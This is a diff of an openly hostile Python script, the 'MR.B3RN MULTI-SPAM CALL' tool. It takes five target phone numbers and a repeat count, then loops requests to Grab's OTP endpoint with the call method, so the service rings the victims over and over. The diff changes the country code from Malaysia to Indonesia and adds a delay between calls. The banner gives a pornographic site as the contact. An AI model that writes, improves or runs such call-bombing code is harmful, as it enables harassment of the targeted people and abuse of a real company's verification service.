@@ -20,7 +20,7 @@ g=('\033[1;32m')
 w=('\033[1;37m')
 print("""%s
 
-		       ⚔️ MR.B3RN MULTI-SPAM CALL ⚔️%s
+		       ⚔️  MR.B3RN MULTI-SPAM CALL ⚔️%s
  ,_     _‚
  |\\\___//|	%sAuthor: MR.B3RN%s
  | =👁️ 👁️= |	%sContact: https://xhamster.com%s
@@ -39,17 +39,18 @@ no3 = input("%s[?] NO.TARGET 3 => %s"%(g,w))
 no4 = input("%s[?] NO.TARGET 4 => %s"%(g,w))
 no5 = input("%s[?] NO.TARGET 5 => %s"%(g,w))
 jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))
-dt1={'method':'CALL','countryCode':'my','phoneNumber':no1,'templateID':'pax_android_production'}
-dt2={'method':'CALL','countryCode':'my','phoneNumber':no2,'templateID':'pax_android_production'}
-dt3={'method':'CALL','countryCode':'my','phoneNumber':no3,'templateID':'pax_android_production'}
-dt4={'method':'CALL','countryCode':'my','phoneNumber':no4,'templateID':'pax_android_production'}
-dt5={'method':'CALL','countryCode':'my','phoneNumber':no5,'templateID':'pax_android_production'}
+dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
+dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
+dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}
+dt4={'method':'CALL','countryCode':'id','phoneNumber':no4,'templateID':'pax_android_production'}
+dt5={'method':'CALL','countryCode':'id','phoneNumber':no5,'templateID':'pax_android_production'}
 
 try:
 	print()
 	print("%s[-] RESULT:"%(r))
 	for i in range(jlmh):
 		print("%s⏳ PLEASE WAIT..."%(w))
+		time.sleep(1)
 		print("%s📲 CALLING..."%(w))
 		idk=("challengeID")
 		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
